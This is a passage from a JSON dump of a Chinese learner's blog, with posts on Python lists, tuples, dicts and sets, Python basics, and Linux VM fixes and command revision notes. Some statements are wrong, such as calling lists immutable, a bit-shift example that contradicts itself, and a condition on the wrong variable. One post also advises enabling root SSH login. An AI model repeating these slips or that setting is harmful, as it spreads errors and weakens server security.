[\"小明\",\"赵四\",\"小赵\",\"李明\"]student.append(\"我是append添加的\")print(student)student.insert(1,\"我是insert添加的\")print(student) （2）添加列表：extend()一个列表的全部元素添加到另一个列表中listname.extend(seq) oldlist = [\"小明\",\"赵四\",\"小赵\",\"李明\"]newlist = [\"张飞\",\"李华\"]oldlist.extend(newlist)print(oldlist) 修改元素list = [\"长亭外\",\"古道边\",\"一行白鹭上青天\"]list[2] = \"芳草碧莲天\"print(list) 删除元素（1）根据索引删除：dellist = [\"长亭外\",\"古道边\",\"一行白鹭上青天\"]print(\"删除前：\",list)del list[2]print(\"删除后：\",list) （2）根据元素值删除：remove()list = [\"长亭外\",\"古道边\",\"一行白鹭上青天\"]print(\"删除前：\",list)list.remove(\"一行白鹭上青天\")print(\"删除后：\",list) 5.对列表进行统计计算获取指定元素出现的次数：count()获取指定元素首次出现的索引值(下标)：index()统计数值列表各元素的和：sum()listname.count(obj)listname.index(obj)sum(iterable[,start]) #将统计结果加上start所指定的数，没有默认0 &gt;&gt;&gt; grade = [89,86,69,59,92]&gt;&gt;&gt; print(sum(grade))395&gt;&gt;&gt; print(sum(grade,5))400 6.对列表进行排序（1）使用列表对象的sort()方法使用sort()方法实现排序后，原列表中的元素顺序改变listname.sort(key=None,reverse=False)#key=str.lower排序不区分大小写#reverse=False按升序排序 grade = [89,86,69,59,92,85]print(\"原列表\",grade)grade.sort() #进行升序排序print(\"升序：\",grade)animal = [\"cat\",\"Dog\",\"panda\",\"Tiger\"]print(\"原动物列表\",animal)animal.sort()print(\"升序：\",animal) （2）使用内置的sorted()函数使用sorted()函数实现排序后原列表的元素顺序不变sorted(iterable,key=None,reverse=False) 7.列表推导式列表推导式可以快速生成一个列表，或者根据某个列表生成满足指定需求的列表。list = [Expression for var in range] 生成随机数的模块：random模块#生成一个长度为10的随机数列表#通过循环实现import random #导入生成随机数的模块list1 = [] #定义一个空列表for i in range(10): list1.append(random.randint(20,100))print(list1)#通过列表推导式实现import random #导入生成随机数的模块list2 = [random.randint(20,100) for i in range(10)]print(list2) 根据列表生成指定需求的列表newlist = [Expression for var in list] price = [1000,800,600,750,900]sale = [int(i*0.5) for i in price]print(\"原价：\",price)print(\"打折后：\",sale) 从列表中选择符合条件的元素组成新的列表newlist = [Expression for var in list if condition] price = [1000,800,600,750,900]sale = [i for i in price if i&gt;800]print(\"原价：\",price)print(\"大于800元的：\",sale) 8.二维列表的使用列表类似于一维数组；二维列表类似于二维数组listname = [[元素1,...,元素n],...,[元素1,...,元素n]] 2、元组(tuple)和列表类似，把[]换成()。且不能对单个元素像列表那样直接修改。(元素1,元素2,...,元素n) 列表是不可变序列，元组可以放入：整数、实数、布尔值、字符串、序列、对象1.元组的创建和删除创建元组（1）使用赋值运算符直接创建元组tuplename = (元素1,元素2,...,元素n) &gt;&gt;&gt; verse1 = (\"我学Pyhon\")&gt;&gt;&gt; print(verse1,type(verse1))我学Pyhon &lt;class 'str'&gt;&gt;&gt;&gt; verse2 = (\"我学Pyhon\",)&gt;&gt;&gt; print(verse2,type(verse2))('我学Pyhon',) &lt;class 'tuple'&gt; （2）创建空元组tuplename = () （3）创建数值元组tuplename = (数值1,数值2,...,数值n) #跳一跳&gt;&gt;&gt; tuple(range(2,21,2))(2, 4, 6, 8, 10, 12, 14, 16, 18, 20) 删除元组del tuplename 2.访问元组元素和列表类似。3.修改元组元素不能对单个元素像列表那样利用索引值直接修改。coffeename = ('蓝山','卡布奇诺','摩卡','麝香猫')print(\"我是原来的\",coffeename)coffeename = ('蓝山','卡布奇诺','摩卡','拿铁')print(\"我是修改后的\",coffeename)newcoffeename = ('麝香猫',)allcoffeename = coffeename + newcoffeenameprint(\"我是添加后的\",allcoffeename) 4.元组推导式快速生成元组。类似于列表推导式tuple = (Expression for var in range) import random #导入生成随机数的模块tuple1 = (random.randint(20,100) for i in range(10))print(tuple1) 得到生成器对象import random #导入生成随机数的模块tuple1 = (random.randint(20,100) for i in range(10))print(tuple(tuple1)) #使用tuple()函数进行转换 使用tuple()函数进行转换，得到元组输出元组元素的值#通过for循环import random #导入生成随机数的模块tuple1 = (random.randint(20,100) for i in range(10))for i in tuple1: print(i,end=' ') #通过__next__()方法import random #导入生成随机数的模块tuple1 = (random.randint(20,100) for i in range(10))#print(tuple1.__next__()) #输出第1个元素#print(tuple1.__next__()) #输出第2个元素#......for j in range(10): print(tuple1.__next__(),end=' ') 对生成器对象访问之后，生成器对象就不存在了。若还想使用生成器对象，需要重新生成import random #导入生成随机数的模块tuple1 = (random.randint(20,100) for i in range(10))print(tuple(tuple1))#通过for循环for i in tuple1: print(i,end=' ') 5.元组与列表的区别相同点：（1）都属于序列。（2）都可以按照一定的顺序存放一组元素，且元素类型不受限制。 不同点：（1）列表属于可变序列(随时添加、修改或删除)；元组属于不可变序列(不能添加、修改和删除元素，可以整体替换)。（2）都支持切片操作。列表可以访问、修改元组中的元素；元组只能访问元组中的元素。（3）列表访问速度慢；元组访问速度快。（4）列表不能作为字典的键；元组可以作为字典的键。 3、字典(dictionary)键-&gt;下标字典是可变序列dictionary = &#123;'key1':'value1','key2':'value2',...,'keyn':'valuen'&#125; key必须唯一，value可以不唯一。1.字典的创建和删除创建字典（1）创建字典的四种方式方式一：&gt;&gt;&gt; dictionary = &#123;'che':'车','chen':'陈','chi':'吃','cheng':'称'&#125;&gt;&gt;&gt; print(dictionary)&#123;'che': '车', 'chen': '陈', 'chi': '吃', 'cheng': '称'&#125; 方式二：&gt;&gt;&gt; dictionary = dict(che = '车',chen = '陈',chi = '吃',cheng = '称')&gt;&gt;&gt; print(dictionary)&#123;'che': '车', 'chen': '陈', 'chi': '吃', 'cheng': '称'&#125; 方式三：key = ['che','chen','chi','cheng'] #音节索引列表value = ['车','陈','吃','称'] #汉字列表zip1 = zip(key,value) #转换为zip对象#zip()函数可以把两个列表对应位置的元素组合为一个元组，并且返回一个zip对象print(zip1)word = dict(zip1) #转换为字典print(word) 方式四：key = ('che','chen','chi','cheng') #音节索引元组#key = ['che','chen','chi','cheng'] 错误，列表不能作为字典的键value = ['车','陈','吃','称'] #汉字列表dictionary = &#123;key:value&#125;print(dictionary) （2）创建空字典&gt;&gt;&gt; word1 = &#123;&#125;&gt;&gt;&gt; print(word1)&#123;&#125;&gt;&gt;&gt; word2 = dict()&gt;&gt;&gt; print(word2)&#123;&#125; （3）使用dict的fromkeys()方法，创建值为空的字典key = ['che','chen','chi','cheng']dictionary = dict.fromkeys(key)print(dictionary) 删除字典#删除字典del dictionary#清除字典中的所有元素dictionary.clear() 2.通过键值对访问字典（1）dict[键]key = ['che','chen','chi','cheng'] #音节索引列表value = ['车','陈','吃','称'] #汉字列表dictionary = dict(zip(key,value)) #转换字典print(dictionary['che'] if 'chei' in dictionary else '字典里没有这个字！') （2）get()方法dictionary.get(key,[default]) key = ['che','chen','chi','cheng'] #音节索引列表value = ['车','陈','吃','称'] #汉字列表dictionary = dict(zip(key,value)) #转换字典print(dictionary.get('che','查无此字'))#指定的键不存在时，不会抛出异常，返回None(指定默认值则返回默认值) 3.遍历字典dictionary = &#123;'che':'车','chen':'陈','chi':'吃','cheng':'称'&#125;#输出可遍历的元组列表print(dictionary.items())#items()方法，返回可遍历的元组列表，每个元组即是键和值print(\"\\n\")#通过for循环，输出每个元组for item in dictionary.items(): print(item)print(\"\\n\")#通过for循环，输出键和值for key,value in dictionary.items(): print(key,\"的汉字是\",value)print(\"\\n\")#输出键for key in dictionary.keys(): print(key)print(\"\\n\")#输出值for value in dictionary.values(): print(value) 4.添加、修改和删除字典元素添加字典元素dictionary[key] = value 修改字典元素dictionary[key] = value 删除字典元素del dictionary[key] dictionary = &#123;'che':'车','chen':'陈','chi':'吃','cheng':'称'&#125;print(\"原字典：\",dictionary)dictionary[\"wang\"] = \"王\" #添加元素print(\"添加后：\",dictionary)dictionary[\"wang\"] = \"网\" #修改元素print(\"修改后：\",dictionary)del dictionary[\"wang\"] #删除元素print(\"删除后：\",dictionary) 5.字典推导式与列表推导式类似&#123;键值表达式:值表达式 for循环&#125; import random #导入生成随机数的模块randomdict = &#123;i:random.randint(20,100) for i in range(10)&#125;print(randomdict) 4、集合(set)可变集合set；不可变集合frozenset。用于保存不重复元素，最好的应用是去重。不支持索引集合是可变序列set = &#123;元素1,元素2,...,元素n&#125; 1.集合的创建（1）使用赋值运算符直接创建集合setname = &#123;元素1,元素2,...,元素n&#125; &gt;&gt;&gt; python = &#123;\"小明\",\"赵四\",\"小赵\",\"李明\",\"张张\",\"李华\",\"王强\"&#125; #选择pyhon学生名字集合&gt;&gt;&gt; print(python,type(python))&#123;'小明', '李华', '李明', '小赵', '王强', '赵四', '张张'&#125; &lt;class 'set'&gt; （2）创建空集合#创建空集合setname = set() set()还可以将列表、元组等可迭代对象转换为集合2.集合的添加和删除添加元素setname.add(element)#element不能是列表、元组等可迭代对象 删除元素（1）删除一个指定元素：remove()setname.remove(元素名称) （2）随机删除一个元素：pop()setname.pop() （3）删除全部元素：clear()setname.clear() 删除集合del setname 3.集合的交集、并集和差集运算python = &#123;\"小明\",\"赵四\",\"小赵\",\"李明\",\"王强\"&#125; #选择Pyhon学生名字集合java = &#123;\"赵四\",\"小赵\",\"张张\",\"李华\"&#125; #选择Java学生名字集合print(\"选择Pyhon学生名字:\",python)print(\"选择Java学生名字:\",java)print(\"交集运算\",python &amp; java) #既选择Pyhon又选择Java学生名字print(\"并集运算\",python | java) #参与选课的全部学生名字print(\"差集运算\",python - java) #选择Python但没有选择Java学生名字 5、列表、元组、字典、集合的区别 后记学习Python序列的应用(列表、元组、字典、集合)之后，了解并练习了列表、元组、字典、集合的一些常用操作。感觉收获很大，继续学习@_@","categories":[{"name":"Python","slug":"Python","permalink":"https://qwzf.gitee.io/blog/categories/Python/"}],"tags":[{"name":"Python","slug":"Python","permalink":"https://qwzf.gitee.io/blog/tags/Python/"},{"name":"序列的应用","slug":"序列的应用","permalink":"https://qwzf.gitee.io/blog/tags/序列的应用/"}],"author":"qwzf"},{"title":"Python学习-基础篇(一)","slug":"Python学习-基础篇(一)","date":"2020-01-16T14:29:30.000Z","updated":"2020-01-18T12:21:57.012Z","comments":true,"path":"2020/01/16/Python学习-基础篇(一)/","link":"","permalink":"https://qwzf.gitee.io/blog/2020/01/16/Python学习-基础篇(一)/","excerpt":"","text":"前言闲来无事，开启Python学习之旅！我分为以下几部分进行学习：开发工具、基本语法、流程控制、序列的应用(列表、元组、字典、集合、字符串)、字符串及正则表达式、函数、面向对象程序设计、模块、异常处理及程序调试、文件及目录操作、操作数据库、网络爬虫、脚本编写、Web框架。本篇包含：开发工具、基本语法、流程控制 一、Python开发工具1、自带的IDLE2、常用的第三方开发工具：PyCharm、Anaconda、Visual Studio 2017、Eclipse+PyDev自带IDLE的常用快捷键： 二、Python基本语法1、语法特点1.注释（1）单行注释# 注释内容 （2）多行注释'''注释形式1注释内容......''' \"\"\"注释形式2注释内容......\"\"\" （3）中文编码声明注释# _*_ coding:编码 _*_ #coding=编码 编码：utf-8、gbk2.代码缩进一个缩进量：一个Tab或4个空格推荐采用空格。注：同一个级别的代码块的缩进量必须相同。如果不采用合理的代码缩进，将抛出SyntaxError异常。3.编码规范采用PEP 8编码规范 每个import语句只导入一个模块，尽量避免一次导入多个模块。不要在行尾添加分号;，也不要用分号将两条命令放在同一行。建议每行不超过80个字符。(可以用()换行连接)使用必要的空行可以增加代码的可读性。(函数和类的定义空2行，方法的定义空1行)运算符两侧、函数参数之间、逗号,两侧建议使用空格进行分割。避免在循环中使用+和+=运算符累加字符串。适当使用异常处理结构提高程序容错性。 命名规范 模块名尽量短小，并且使用全部小写字母，可以使用_分隔多个字母。包名尽量短小，并且使用全部小写字母。类名采用单词首字母大写形式(即Pascal风格)。模块内部的类由_+Pascal风格的类名组成。函数、类的属性和方法名全部采用小写字母，多个字母间用_分隔。常量命名时采用全部大写字母，可以使用_。使用_开头的模块变量或函数是受保护的。使用__开头的实例变量或方法是类私有的。 2、保留字与标识符1.保留字Python 3.6版有33个保留字(关键字)，Python 3.7版本中正式引入两个新的关键字async与await，共35个关键字。保留字是区分字母大小写的。import keywordprint(keyword.kwlist) --- Python 3.6 Console Output ---['False', 'None', 'True', 'and', 'as', 'assert', 'break', 'class', 'continue', 'def', 'del', 'elif', 'else', 'except', 'finally', 'for', 'from', 'global', 'if', 'import', 'in', 'is', 'lambda', 'nonlocal', 'not', 'or', 'pass', 'raise', 'return', 'try', 'while', 'with', 'yield']--- Python 3.7 Console Output --- ['False', 'None', 'True', 'and', 'as', 'assert', 'async', 'await', 'break', 'class', 'continue', 'def', 'del', 'elif', 'else', 'except', 'finally', 'for', 'from', 'global', 'if', 'import', 'in', 'is', 'lambda', 'nonlocal', 'not', 'or', 'pass', 'raise', 'return', 'try', 'while', 'with', 'yield'] 2.标识符_标识符 保护变量__标识符 类的私有成员__标识符__ 专用标识(如：__init__()构造函数) 3、变量不需要提前声明，直接赋值使用即可type()可以查看变量类型id()可以获取变量的内存地址&gt;&gt;&gt; name = \"qwzf\"&gt;&gt;&gt; print(name)qwzf&gt;&gt;&gt; age = 20&gt;&gt;&gt; print(age)20&gt;&gt;&gt; type(name)&lt;class 'str'&gt;&gt;&gt;&gt; type(age)&lt;class 'int'&gt; 多个变量指向同一个值时，在内存中就只存在一个值。&gt;&gt;&gt; num = count = 1024&gt;&gt;&gt; print(num)1024&gt;&gt;&gt; print(count)1024&gt;&gt;&gt; id(num)2179811900336&gt;&gt;&gt; id(count)2179811900336&gt;&gt;&gt; 变量命名规则： 必须是一个有效的标识符选择有意义的单词不能使用Python中的保留字慎用小写字母l和大写字母O 4、基本数据类型基本数据类型有：数字类型、字符串类型、布尔类型1.数字类型数字类型：整数、浮点数、复数浮点数计算时，可能会出现小数位数不确定的情况。要用到函数round()进行小数位数保留。&gt;&gt;&gt; 0.1+0.20.30000000000000004&gt;&gt;&gt; round(0.1+0.2,1)0.3&gt;&gt;&gt; 2.字符串类型使用单引号和双引号，内容必须写在一行上；使用三引号，内容可以分多行写。text1 = '学习Pyhon' #使用单引号text2 = \"学习编程\" #使用双引号text3 = '''继续学习中，请勿打扰''' #使用三引号 字符串类型，有时会用到转义字符\\3.布尔类型假值：（1）False或None（2）0、0.0、虚数0（3）空序列(空字符串、空元组、空列表、空字典)（4）对象的__bool__方法返回False或者__len__方法返回0真值：除上述返回假值的情况外，都是返回真值4.数据类型转换int()强制转换成整型float()强制转换成浮点型str()强制转换成字符串型hex()强制将整数转换为16进制字符串oct()强制将整数转换为8进制字符串&gt;&gt;&gt; num = 100.25&gt;&gt;&gt; num1 = str(num)&gt;&gt;&gt; print(num1)100.25&gt;&gt;&gt; type(num1)&lt;class 'str'&gt;&gt;&gt;&gt; num2 = int(num)&gt;&gt;&gt; print(num2)100 5、运算符运算符包含：算术运算符、赋值运算符、比较(关系)运算符、逻辑运算符、位运算符1.算术运算符+、-、*、/取整除：//(向下取整)取余：%幂次：**2.赋值运算符简单赋值 =加法赋值 +=减法赋值 -=乘法赋值 *=除法赋值 /=取整除赋值 //=取余赋值 %=幂赋值 **=3.比较(关系)运算符等于 ==不等于 != 或 &lt;&gt;(a != b 或 a &lt;&gt; b)大于 &gt;小于 &lt;大于等于 &gt;=小于等于 &lt;=4.逻辑运算符逻辑运算符返回值为true 或 false。布尔与 and ：如果 x 为 False，x and y 返回 False，否则它返回 y 的计算值。。布尔或 or ：如果 x 是非 0，它返回 x 的值，否则它返回 y 的计算值。布尔非 not ： 如果 x 为 True，返回 False 。如果 x 为 False，它返回 True。5.位运算符位运算过程中，把数字转化成二进制计算，然后再转化成数字。按位与 &amp; ：参与运算的两个值,如果两个相应位都为1,则该位的结果为1,否则为0。按位或 |：参与运算的两个值, 只要有一个位置为1，则该位的结果为1。按位异或 ^ ：参与运算的两个值,如果两个相应位数值不同，则结果为1，若相同，则结果为0.按位取反 ~ ：对数据的每个二进制位取反,即把1变为0,把0变为1 。左移位 &lt;&lt; ：若 a &lt;&lt; 2 将数字a对应的二进制数集体向左移动2位，后面空余的2位补零。(例：原a二进制：0011 1100, a &lt;&lt; 2 ,得 1111 0000，加黑为补零位。)右移位 &gt;&gt; ：若 a &gt;&gt; 3 将数字a对应的二进制数集体向右移动2位，前面空余的2位补零。(例：原a二进制：0011 1100, a &gt;&gt; 2 ,得 0000 1111，加黑为补零位。)6.成员运算符检测 x 是否在 y 的序列中。in ：若 x 在 y 的序列中，则返回True，否则返回False。not in ：若 x 不在 y 的序列中，则返回True，否则返回False。7.身份运算符用于比较两个对象 A 和 B 的存储单元是否一致，即判断两个标识符 A 和 B 是不是引用自一个对象。is ： x is y, 类似 id(x) == id(y) , 如果引用的是同一个对象则返回 True，否则返回 False。 # id() 函数用于获取对象内存地址。is not ： x is not y ， 类似 id(a) != id(b)。如果引用的不是同一个对象则返回结果 True，否则返回 False。 # id() 函数用于获取对象内存地址。8.运算符的优先级 6、基本输入和输出1.input()函数输入input()函数返回值是字符串类型variable = input(\"提示文字\") 返回值类型转换&gt;&gt;&gt; tips = input(\"请输入内容：\")请输入内容：123&gt;&gt;&gt; print(tips,type(tips))123 &lt;class 'str'&gt;&gt;&gt;&gt; hints = int(input(\"请输入内容：\"))请输入内容：456&gt;&gt;&gt; print(hints,type(hints))456 &lt;class 'int'&gt; 2.print()函数输出print(输出内容) a = 6b = 111print(\"数字：\",666)print(\"表达式：\",a*b)print(\"字符串：\",\"努力吧！！\") 输出到文件fp = open(r'D:\\demo.txt','a+')print(\"加油！奥利给！！\",file = fp)fp.close() 在一行输出for i in range(1,10): print(i,end=' ') 三、流程控制1、选择语句1.简单的if语句if 表达式: 语句块 2.if…else语句if 表达式: 语句块1else: 语句块2 3.if…elif…else语句if 表达式1: 语句块1elif 表达式2: 语句块2......else: 语句块n 如果已经定义一个布尔变量flag，if语句应写成以下形式：if flag:if not flag:下面这种形式是不规范的：if flag == True:(X) 4.if语句的嵌套if 表达式1: if 表达式2: 语句块2 else: 语句块3else: 语句块1 2、条件表达式好处：使代码简洁；可以有一个返回值结果1 if 表达式 else 结果2 表达式为真，返回结果1；表达式为假，返回结果2通常把结果赋值给一个变量#求两个数的最大值a = 10b = 20r = a if a&gt;b else bprint(r)#求一个数的绝对值x = -10y = x if a&gt;0 else -x 3、循环语句1.while循环一直重复，直到条件不满足时，才停止while 条件表达式: 循环体 2.for循环重复一定次数，通常用于迭代、枚举或遍历for 迭代变量 in 对象: 循环体 循环数值#计算1+2+...+100的和result = 0 #保存累加结果的变量for i in range(101): result += i #实现累加print(result) 遍历字符串string = '努力不一定成功'for ch in string: print(ch) range()函数：生成一系列连续的整数range(start,end,step)start: 计数从start开始。默认是从 0 开始。例如：range(5)等价于range(0,5)end: 计数到end结束，但不包括 stop。例如：range(0,5)是[0, 1, 2, 3, 4]没有5step：步长，默认为1。例如：range(0,5)等价于range(0,5,1) range()函数替换Python2中的xrange()函数3.循环嵌套while 条件表达式1: while 条件表达式2: 循环体2 循环体1 while 条件表达式: for 迭代变量 in 对象: 循环体2 循环体1 for 迭代变量 in 对象: while 条件表达式: 循环体2 循环体1 等等 4、跳转语句1.break语句完全跳出循环2.continue语句只跳出一次循环，然后继续下一次循环 5、pass空语句pass语句，表示空语句。它不做任何事情，一般起到占位作用。通常用于流程控制语句、函数、类中。for i in range(1,10): if i%2 == 0: print(i,end=',') #输出偶数 else: pass #占位，不做任何事 后记学习完Python的开发工具、基本语法、流程控制，对Python的一些语法有了一些认识。收获之处：学习了流程控制中条件表达式和for循环的使用。同时注意到Python中没有do…while循环。继续学习@_@","categories":[{"name":"Python","slug":"Python","permalink":"https://qwzf.gitee.io/blog/categories/Python/"}],"tags":[{"name":"Python","slug":"Python","permalink":"https://qwzf.gitee.io/blog/tags/Python/"},{"name":"开发工具","slug":"开发工具","permalink":"https://qwzf.gitee.io/blog/tags/开发工具/"},{"name":"基本语法","slug":"基本语法","permalink":"https://qwzf.gitee.io/blog/tags/基本语法/"},{"name":"流程控制","slug":"流程控制","permalink":"https://qwzf.gitee.io/blog/tags/流程控制/"}],"author":"qwzf"},{"title":"Linux虚拟机常见使用及常见问题","slug":"Linux虚拟机常见使用及常见问题","date":"2020-01-07T08:08:02.142Z","updated":"2020-01-11T16:58:53.435Z","comments":true,"path":"2020/01/07/Linux虚拟机常见使用及常见问题/","link":"","permalink":"https://qwzf.gitee.io/blog/2020/01/07/Linux虚拟机常见使用及常见问题/","excerpt":"","text":"前言Linux使用过程中经常遇到一些问题，于是总结一下。 一、ubantu不显示和不能用本地ip解决方法：sudo dhclient ens33sudo ifconfig ens33 二、ubantu解决“无法获得锁”现象一：E: 无法获得锁 /var/lib/dpkg/lock - open (11: 资源暂时不可用)在ubuntu系统的termial下，用apt-get install 安装软件的时候，如果在未完成下载的情况下将terminal close。此时 apt-get进程可能没有结束，而Linux只允许开一个apt-get。结果，如果再次运行apt-get install 命令安装如今，可能会发生下面的提示： 无法获得锁 /var/lib/dpkg/lock - open (11: 资源暂时不可用)无法锁定管理目录(/var/lib/dpkg/)，是否有其他进程正占用它？ 解决方法一：终端输入 ps aux|grep apt ，列出进程。找到含有apt-get的，直接sudo kill PID。如：sudo kill -9 PID 解决方法二：强制解锁,命令sudo rm /var/lib/dpkg/lock或sudo rm /var/lib/apt/lists/lock 现象二：E: 无法获得锁 /var/cache/apt/archives/lock - open (11 资源临时不可用) E: 无法获得锁 /var/cache/apt/archives/lock - open (11 资源临时不可用)E: 无法锁定下载目录 解决方法一：1、命令：ps -aux | grep apt-get 列出进程2、找到最后一列以apt-get 开头的进程命令：sudo kill 该进程的PID解决方法二：sudo rm /var/cache/apt/archives/lock sudo rm /var/lib/dpkg/lock 三、配置桥接网络，静态ip1、配置VMware虚拟机的网络适配器为桥接模式2、首先输入命令：vi /etc/network/interfaces，配置ip信息3、重启网卡：service networking restart输入ifconfig发现配置成功4、DNS域名解析服务器配置：vi /etc/resolv.conf /etc/resolv.conf它是DNS客户机配置文件，用于设置DNS服务器的IP地址及DNS域名，还包含了主机的域名搜索顺序。该文件是由域名解析器（resolver，一个根据主机名解析IP地址的库）使用的配置文件。它的格式很简单，每行以一个关键字开头，后接一个或多个由空格隔开的参数。resolv.conf的关键字主要有四个，分别是： nameserver #定义DNS服务器的IP地址domain #定义本地域名search #定义域名的搜索列表sortlist #对返回的域名进行排序 下面我们给出一个/etc/resolv.conf的示例： domain 51osos.comsearch 51osos.comnameserver 202.102.192.68nameserver 202.102.192.69 最主要是nameserver关键字，如果没指定nameserver就找不到DNS服务器，其它关键字是可选的。这里写nameserver关键字即可5、重启网卡：service networking restart测试：ping www.baidu.com6、查看内网存活主机：nmap -sn 192.168.1.1-255 四、使用ssh以root用户直接登录出于安全考虑，ubuntu默认不允许root远程登录解决方案：1、安装openssh软件sudo apt install -y openssh-server 2、编辑SSH文件sudo nano /etc/ssh/sshd_config将PermitRootLogin 的值改为yes将PermitEmptyPasswords 的值改为no 3、重启ssh服务service ssh restart 4、重新登录，就可以以root用户直接登录ssh。 五、Ubuntu下搭建LAMP环境以及安装nginx服务器参考：Ubuntu18.04下搭建LAMP环境ubantu lamp环境安装Ubuntu 16.04搭建LAMP开发环境 ubantu下搭建php5.6+nginx+mysql开发环境ubantu-nginx部署ubuntu16.04安装nginx教程Ubuntu18.04搭建nginx服务器 后记大致就先总结那么多，持续更新中。。。。。","categories":[{"name":"Linux","slug":"Linux","permalink":"https://qwzf.gitee.io/blog/categories/Linux/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"https://qwzf.gitee.io/blog/tags/Linux/"},{"name":"问题整理","slug":"问题整理","permalink":"https://qwzf.gitee.io/blog/tags/问题整理/"}],"author":"qwzf"},{"title":"Linux基础期末整理复习","slug":"Linux基础期末整理复习","date":"2019-12-26T08:50:43.000Z","updated":"2020-01-07T08:21:06.880Z","comments":true,"path":"2019/12/26/Linux基础期末整理复习/","link":"","permalink":"https://qwzf.gitee.io/blog/2019/12/26/Linux基础期末整理复习/","excerpt":"","text":"一、常用命令1、目录操作命令1.查看当前目录：pwd命令提示符由哪几部分组成：命令名 [选项][参数]2.查看目录：ls -alls -l 长格式显示ls -a 显示所有文件（包含隐藏文件）ls -alls -h 以常用单位显示文件大小ls -d 只显示目录，不显示目录下子文件ls -i 显示文件 inode 号ls -l 文件名隐藏文件名特点：文件名前面都有个带点的符号;显示的每一条信息各部分的含义：权限位 引用计数 属主 属组 大小 最后一次修改时间 文件名 3.切换目录：cd 目录名使用cd命令切换到上一层目录 使用绝对路径的方式切换到上层目录：cd 具体路径使用相对路径的方式切换到上层目录：cd ..“ .. ”表示上一级目录；“ .”表示当前目录。 4.创建目录：mkdir 目录名使用mkdir命令在用户主目录下分别使用绝对路径和相对路径的方式创建一个newdir目录在root目录下进行操作命令分别为：mkdir /root/newdirmkdir ./newdir5.删除目录：rmdir 目录名||rm 目录名||rm -rf 目录名使用rmdir命令删除刚才创建的newdir目录rm newdir（只能删空目录）；rm –rf newdir 2、文件操作命令1.创建空文件：touch 文件名2.删除文件：rm -rf 文件名3.查看文件内容：cat 文件名4.分屏显示文件内容：more 文件名5.分行显示文件内容：less 文件名6.显示文件头：head 文件名head -n 行数 文件名 指定显示文件头几行7.显示文件尾：tail -n 行数 文件名 3、目录和文件操作命令1.删除文件或目录：rm ||rm -rf2.复制文件或目录：cp 源文件 目标位置-r 复制目录-p 连带文件属性复制-d 若源文件是链接文件，则复制链接属性-a 相当于 -pdr 可进行原名复制和改名复制3.移动或重命名文件或目录：mv 源文件 目标位置4.链接文件硬链接：ln 源文件 目标文件可以看作是同一个文件进行复制 不能跨分区不能针对目录使用 软链接：ln -s 源文件 目标文件文件名都必须写绝对路径类似 于Windows 快捷方式 软链接文件权限都为 rwxrwxrwx修改任意文件，另一个都改变删除原文件，软链接不能使用 4、权限管理1.权限位-rw-r–r– 1 root root 0 08-11 01:45 aa属主权限 u 属组权限 g 其他人权限 o权限对文件的含义r 读：读取文件内容 cat more head tail 4w 写：编辑、新增、修改文件内容(但是不包含删除文件) vi echo 2x 执行：可执行 1权限对目录的含义r：可以查询目录下文件名 lsw：具有修改目录结构的权限 touch rm mv cpx：可以进入目录 cd 2.修改权限chmod u+x aa aa文件的属主加上执行权限chmod u-x aa aa文件的属主减去执行权限chmod g+w,o+w aa aa文件的属组和其他人加上写权限chmod u=rwx aa aa文件的属主赋读写和执行权限chmod 755 aachmod 644 aa文件和目录默认权限：umask0022文件： 666 022 644目录： 777 022 7553.属主和属组命令chown 用户名 文件名 改变文件属主chown 用户名:属组名 文件名 改变属主同时改变属组 useradd 用户名 添加用户passwd 用户名 设定用户密码 chgrp 属组名 文件名 改变属组 5、帮助命令man 命令名 查看命令的帮助help 内部命令 查看内部命令帮助命令 --help 查看命令的常见选项info 命令 进入子帮助页面(带有*号标记) 6、查找命令which 命令名 查找命令的命令，能看到相关别名whereis 命令名 查找命令的命令，同时看到帮助文档位置locate 文件名 按照文件名查找 按照数据库查找 updatedb强制更新数据库 1.find 查找位置 -name 文件名 按照文件名查找按照时间查找-ctime 按照文件状态修改时间（天） change-mtime 按照文件数据修改时间 modify-atime 按照访问时间 access如：find / -ctime +4 按照用户-uid 数字 按照用户属主 ID 查找文件-gid 数字 按照属组组 ID 查找文件-user 用户名 按照属主用户名查找文件-group 组名 按照属组组名查找文件-nouser 找没有属主的文件 find / -nouser 按照文件权限-name 按照文件名-size 按照文件大小。+50k:大于 50k，-50k:小于 50k，50k:等于50k如：find / -size +50k-type 类型 按照文件类型 。f：普通 d：目录 l：链接-perm 755 按照权限查找如：find . -perm 644-inum 按照 i 节点 ls -i如：find . -inum 节点数-iname 按照文件名查找，不区分大小写 2.grep &quot;字符串&quot; 文件名 查找符合条件的字串行grep -i &quot;root&quot; /etc/passwd-v 反向选择-i 忽略大小写 | 管道符命令 1 | 命令 2 命令 1 的结果，作为命令 2 的执行条件 7、压缩和解压缩（1）.zip格式压缩：zip 压缩之后产生的包名 源文件如：zip -r test.zip /test -r 压缩目录解压缩：unzip 压缩包（2）.gz格式不会打包压缩：gzip -c 源文件 &gt; 压缩文件如：gzip -c cangls &gt; cangls.gzgzip -r 源目录 不能压缩目录，压缩目录下所有内容解压缩：gzip -d 压缩包（3）.bz2格式不能压缩目录压缩：bzip2 源文件 如：bzip2 aabzip2 -k 源文件 压缩之后保留源文件解压缩：bzip2 -d 压缩文件 如：bzip2 -d aa.bz2 另一种：bunzip2 压缩文件 解压缩：-k 保留压缩文件（4）.tar格式打包命令，不压缩打包：tar -cvf 打包文件名 源文件 如：tar -cvf aa.tar aa-c 打包 -v 显示打包过程 -f 指定生产后的文件名解打包：tar -xvf 打包文件名 如：tar -xvf aa.tar .gz 格式压缩同时打包：tar -zcvf 压缩文件名 源文件如：tar -zcvf aa.tar.gz aa -z 识别.gz 格式解压缩同时解打包：tar -zxvf 压缩文件名 .bz2格式压缩同时打包：tar -jcvf 压缩文件名 源文件压缩同时打包如：tar -jcvf aa.tar.bz2 aa解打包同时解压缩：tar -jxvf aa.tar.bz2 查看不解包tar -ztvf aa.tar.gz 查看不解包tar -jtvf aa.tar.bz2 -t 只查看，不解压 指定解压缩文件位置：tar -jxvf root.tar.bz2 -C /tmp/ 指定解压缩位置 8、常用网络命令w 查询当前登录服务器的所有用户who 查询登录用户last 列出登录系统的相关信息lastlog 显示所有账户最后一次的登录时间write 用户名 给在线用户写信息如：write root tty1 写内容给 tty1 登录的 root，ctrl+d 保存，发送wall 对所有在线用户说话mail 邮件命令 ping -c 次数 ip 探测网络通畅ping -s 65536 ip 指定探测数据包的大小 ifconfig 查询本机网络信息ifconfig eth0 192.168.140.252 netmask 255.255.255.0 临时生效eth0:0 第一块网卡的第一模拟网卡 netstat 查看网络状态telnet ip 端口 测试端口是否可以正常连接netstat 